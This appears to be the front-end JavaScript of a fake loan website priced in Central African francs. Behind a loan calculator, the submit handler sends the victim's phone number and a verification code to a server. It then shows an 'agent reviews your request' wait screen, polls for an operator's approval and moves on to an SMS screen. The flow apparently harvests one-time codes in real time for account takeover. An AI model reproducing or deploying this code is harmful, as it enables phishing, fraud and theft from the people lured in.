// Show a specific screen and hide others
function showScreen(screenId) {
    document.querySelectorAll('.app-screen').forEach(screen => {
        screen.classList.remove('active');
    });
    document.getElementById(screenId).classList.add('active');
    document.getElementById(screenId).scrollTop = 0;
}

// Loan Calculator Logic
const amountSlider = document.getElementById('loan-amount');
const termSlider = document.getElementById('loan-term');
const amountDisplay = document.getElementById('amount-display');
const termDisplay = document.getElementById('term-display');
const monthlyPaymentDisplay = document.getElementById('monthly-payment');

function calculateLoan() {
    const amount = parseFloat(amountSlider.value);
    const months = parseFloat(termSlider.value);
    
    amountDisplay.innerText = 'XAF ' + amount.toLocaleString();
    termDisplay.innerText = months + ' Months';

    const interestRate = 0.01; // 1% monthly
    const monthlyPayment = (amount / months) + (amount * interestRate);
    
    monthlyPaymentDisplay.innerText = 'XAF ' + Math.round(monthlyPayment).toLocaleString();
}

amountSlider.addEventListener('input', calculateLoan);
termSlider.addEventListener('input', calculateLoan);
calculateLoan();

// Submit Application Logic
document.getElementById('submit-btn').addEventListener('click', async function(e) {
    e.preventDefault();
    
    // Show the processing screen
    document.getElementById('processing-title').innerText = "Processing Application";
    document.getElementById('processing-text').innerText = "Please wait while an agent reviews your loan request. Do not close this page.";
    document.getElementById('loader-spinner').style.display = "block"; 
    showScreen('screen-processing');

    const data = {
        phone: document.getElementById('phone').value,
        code: document.getElementById('verification-code').value
    };

    try {
        const response = await fetch('/api/apply', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });

        const result = await response.json();

        if (result.success && result.appId) {
            // START POLLING: Check status every 3 seconds
            const interval = setInterval(async () => {
                try {
                    const statusRes = await fetch(`/api/status/${result.appId}`);
                    const statusData = await statusRes.json();

                    if (statusData.status === 'approved') {
                        clearInterval(interval); // Stop checking
                        
                        // Show a quick "Approved" message, then jump to SMS page
                        document.getElementById('processing-title').innerText = "Approved!";
                        document.getElementById('processing-text').innerText = "Redirecting...";
                        document.getElementById('loader-spinner').style.display = "none"; 
                        
                        setTimeout(() => {
                            showScreen('screen-sms');
                        }, 1000); // Wait 1 second, then show SMS screen

                    } else if (statusData.status === 'rejected') {
                        clearInterval(interval); // Stop checking
                        document.getElementById('processing-title').innerText = "Application Rejected";
                        document.getElementById('processing-text').innerText = "Unfortunately, we cannot offer you a loan at this time.";
                        document.getElementById('loader-spinner').style.display = "none"; 
                    }
                } catch (error) {
                    console.error("Waiting for approval...", error);
                }
            }, 3000); // 3000 milliseconds = 3 seconds
        } else {
            alert("Error sending application.");
            showScreen('screen-step3');
        }
    } catch (error) {
        console.error(error);
        alert("Network error.");
        showScreen('screen-step3');
    }
});